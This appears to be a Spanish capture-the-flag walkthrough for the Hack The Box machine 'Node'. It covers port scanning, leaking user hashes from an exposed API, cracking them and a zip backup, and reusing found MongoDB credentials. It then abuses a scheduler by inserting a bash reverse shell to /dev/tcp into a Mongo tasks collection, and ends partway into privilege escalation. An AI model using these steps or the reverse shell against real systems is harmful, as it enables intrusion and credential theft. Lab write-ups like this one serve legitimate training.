# Node-HTB

Esta es la resolucion de la maquina Node

## NMAP

Solo tiene dos puertos abiertos el 22 y el 3000

```
sudo nmap -sSVC -p22,3000 -vvv 10.129.75.0 -oN scan

PORT     STATE SERVICE
22/tcp   open  ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) (Ubuntu 16.04.7 LTS (Xenial Xerus)

3000/tcp open  ppp hadoop-datanode syn-ack ttl 63 Apache Hadoop


```

Ya sabes con eso basta para enumerar con que Ubuntu estamos trabajando.

## WHATWEB

Hay que intentar enumerar con lo que se pueda para saber a que nos estamos enfrentando.

```
whatweb http://10.129.74.234:3000/ 
```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/fdf5f69e-a20d-40eb-802f-558fb3d4dc38)


## CURL

Para ver con que estamos tratando lanza un head.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/170e9f88-2dde-4c27-9c5c-4ed64840bc93)


```
curl -I http://10.129.74.234:3000/

```

Toda esta informacion tambien podria verse desde el dev tools de firefox ya que en el oscp no se permite usar.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/defa3833-8160-4aa6-96c0-f44090feedab)

En la peticion se comienza a notar que exiten diferentes rutas dentro de ese servidor.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/956f38dc-45af-4e44-91f9-bf8ff48fa266)

Entonctramos usuarios que se podrian usar como potencial vector de ataque

```
id	"59a7368398aa325cc03ee51d"
username	"tom"
password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
is_admin	false
1	
_id	"59a7368e98aa325cc03ee51e"
username	"mark"
password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
is_admin	false
2	
_id	"59aa9781cced6f1d1490fce9"
username	"rastating"
password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
is_admin	false
```

La ruta que nos dice que hay una api es 

```
http://10.129.74.234:3000/api/users/latest
```

## FFUF

```
ffuf -r -fc 404 -fs 3861 -t 1000  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.75.0:3000/api/FUZZ

```

Siempre es bueno revisar las rutas que tienen la api pasar por ahi con el navegador. Por suerte aqui me aparecio una ruta Users( si con mayusculas). Y al visitarla jalaba mas datos un usuario admin

```
http://10.129.74.234:3000/api/users/

[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]

```

## HASHCAT

Tambien tenemos un login en la pagina se crackearon todos los hashes que se entontro:

```
hashid hash

hashcat -m 1400 hash_backup /usr/share/wordlists/rockyou.txt


tom:spongebob
mark:snowflake
rastating:no se pudo
myP14ceAdm1nAcc0uNT:manchester

```

Por la version de SSH se pudo enumerar pero como usa cosas con python 2 manda errores termine haciendolo con metasploit. Mejor intentalo con wfuzz o ffuf.

## fcrackzip vs JTR


![image](https://github.com/gecr07/Node-HTB/assets/63270579/0860137e-a837-4fb9-9ef6-821ca28a6b44)

Esto descarga un archivo que es un backup

```
file

cat file | base64 -d > file_decode
file # Nos dice que es un zip

7z l file
7z x file

## S4VITAR lo hizo asi para dejar todo en el mismo archivo

cat mybackup | base64 -d | sponge mybackup
```

Para crackear el passwd del .zip tenemos dos opciones JTR o fcrackzip.

```
 sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file_backup 


PASSWORD FOUND!!!!: pw == magicword

## S4VITAR

zip2john file.zip > hash # te extrae un hash

john -w rockyou.txt hash
                         
```

Revisamos el app.js y ya de entrada vemos 2 cosas que son como keys mongo es una base de datos NOSQL.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/e3335b8f-fd70-4e3f-80c2-2f5a617c2349)


Nos loggeamos con las credenciales de admin que entonctramos hasta aqui ya sabemos varias cosas esta usando NODEJS despues usa de servidor Express tiene una API ya tenemos usuarios validos y un servicio SSH en el puerto 22 toca probar todas las credenciales a ver si una es.

Ya te digo que ninguna credencial de las anteriores servis para inciar session con ssh. Pero si la que encontraste en el archivo.

```
sshpass -p 'passowrd' ssh tom@10.10.10.58 # esto sirve para poder automatizar algun script y probar passwords
```

## ss vs netstat

No en todos los sistemas tienen netstat pero tal parece que si ss

```
ss -ant
-a (de all)  Display both listening and non-listening (for TCP this means established connections) sockets
-n Do not try to resolve service names.
-t Display TCP sockets.

## Shortcut

shift / para buscar
N para atras
n para adelante
g volver a incio
h help 

```


## MONGODB

Para poder conectase a esta base de datos se hace asi:

```
 const url= 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
  12   │ const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

## Conectarse

mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace

```

Para enumerar la base de datos mongo es un poco diferente.En MongoDB, en lugar de "tablas", se utilizan "colecciones". 


```
use myplace
show dbs
show collections
db.users.find()

```

## PSPY

![image](https://github.com/gecr07/Node-HTB/assets/63270579/d5b82dc6-da41-4ceb-b14b-2e2832c9cf93)

Nos damos cuenta y tambien con el linpeas.sh que este usuario no puede hacer nada. Despues que se ejecutan 2 diferentes app.js

```
/usr/bin/node /var/www/myplace/app.js
/usr/bin/node /var/scheduler/app.js

```

Vemos el archivo que esta en scheduler

![image](https://github.com/gecr07/Node-HTB/assets/63270579/e04bb5af-0632-4db2-9363-a66ab9385c68)

> This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the tasks collection. For each doc, it will pass doc.cmd to exec to run it, and then delete the doc.

## RCE

![image](https://github.com/gecr07/Node-HTB/assets/63270579/722f9079-8a48-4d72-bc5b-6261d2264133)


Enumerando todo lo que se pudo se tiene que hacer es intentar volverse el usuario tom. Esta es otra manera de conectase a mongodb.

```
mongo -u mark -p 5AYRft73VtFpc84k scheduler
mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler

show collections

db.tasks.find()

db.tasks.insert({"cmd": "touch /tmp/masa"})

## Reverse shell

 db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.108/1234 0>&1'"})

```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/60b46db4-78d0-4d38-9073-b852408a5da8)

## FULLY TTY

```
script /dev/null -c bash
CTRL + X

stty raw -echo;fg
     reset xterm
export TERM=xtem
export SHELL=/bin/bash
```

> adm means that I can access all the logs, and that’s worth checking out, but admin is more interesting. It’s group id (gid) is above 1000, which means it’s a group created by an admin instead of by the OS, which means it’s custom. Looking for files with this group, there’s only one.


```
find / -type f -perm -4000 -user root 2>/dev/null
```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/4c0e57f1-69cb-4139-8bc5-d34c0a70eac0)


Mismo archivo que ya sabiamos que era SUID con el linpeas.

> Interestingly, this binary is called from /var/www/myplace/app.js


## Dynamic analysis

![image](https://github.com/gecr07/Node-HTB/assets/63270579/1ae3c311-5f20-4903-9e42-bb229c3c0ffd)

Intentamos ver ese archivo que hace nos lo topamos en app.js el normal no el schedule. Tiene 3 archivos y al parecer genera  backups.















































